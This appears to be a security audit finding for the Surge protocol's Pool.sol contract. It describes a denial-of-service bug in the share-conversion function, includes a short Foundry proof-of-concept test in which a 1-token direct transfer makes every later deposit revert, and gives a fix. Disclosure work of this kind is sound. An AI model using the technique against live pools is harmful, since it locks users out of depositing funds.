bin2chen

medium

# Pool.sol DOS attack

## Summary
the wrong use  ```_supplied == 0``` as a judgment condition ,  A malicious user can execute a DOS attack, causes  anyone unable to deposit
## Vulnerability Detail

The current formula for converting assets and shares is as follows:
```solidity
    function tokenToShares (uint _tokenAmount, uint _supplied, uint _sharesTotalSupply, bool roundUpCheck) internal pure returns (uint) {
        if(_supplied == 0) return _tokenAmount;   //<------This place should use if (_sharesTotalSupply ==0)
        uint shares = _tokenAmount * _sharesTotalSupply / _supplied;
        if(roundUpCheck && shares * _supplied < _tokenAmount * _sharesTotalSupply) shares++;
        return shares;
    }
```
Here is a problem, the wrong use  ```_supplied == 0``` as a judgment condition, if the malicious user directly transfer 1 token into the contract, will lead to deposit()  no matter deposit how much, the returned shares are 0 always, resulting in revert.deposit()  can't work anymore

The test code is as follows:
add to Pool.t.sol
```solidity
    function testDos() external {
        uint amount = 1e36;
        MockERC20 collateralToken = new MockERC20(0, 18);
        MockERC20 loanToken = new MockERC20(amount, 18);
        Pool pool = factory.deploySurgePool(IERC20(address(collateralToken)), IERC20(address(loanToken)), 1e18, 0.8e18, 1e15, 1e15, 0.1e18, 0.4e18, 0.6e18);
        //1.Malicious transfer 1 to pool
        loanToken.transfer(address(pool), 1); 
        loanToken.approve(address(pool), amount);
        //2.any depoist will revert with "Pool: 0 shares"
        pool.deposit(1000);
    } 
```

```console
$ forge test --match testDos -vvv

Running 1 test for test/Pool.t.sol:PoolTest
[FAIL. Reason: Pool: 0 shares] testDos() (gas: 2695684)
```

## Impact
DOS attack , Pool.sol Unable to deposit
## Code Snippet

https://github.com/sherlock-audit/2023-02-surge/blob/main/surge-protocol-v1/src/Pool.sol#L200

## Tool used

Manual Review

## Recommendation

```solidity
    function tokenToShares (uint _tokenAmount, uint _supplied, uint _sharesTotalSupply, bool roundUpCheck) internal pure returns (uint) {
-       if(_supplied == 0) return _tokenAmount;
+       if(_sharesTotalSupply == 0) return _tokenAmount;  // Don't worry _sharesTotalSupply !=0  but _supplied==0 
        uint shares = _tokenAmount * _sharesTotalSupply / _supplied;
        if(roundUpCheck && shares * _supplied < _tokenAmount * _sharesTotalSupply) shares++;
        return shares;
    }
```
